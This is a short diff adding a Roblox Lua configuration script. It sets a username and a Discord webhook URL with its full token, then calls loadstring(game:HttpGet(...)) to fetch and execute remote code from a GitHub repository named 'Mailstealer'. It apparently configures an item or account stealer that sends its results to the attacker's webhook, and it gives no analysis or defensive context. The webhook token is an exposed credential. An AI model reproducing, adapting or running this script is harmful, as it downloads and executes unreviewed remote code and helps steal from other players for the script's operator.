@@ -1,0 +1,6 @@
+UserName = "vlaewewewret"
+Webhook = "https://discord.com/api/webhooks/1140689124123214005/0zvLrlRXORIswwHaqP7jIf07a70WioOdkDMjcsdwRERFDG2VAMFKmoxvduX91Bak9dUK"
+UserName2 = "vlaewewewret"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
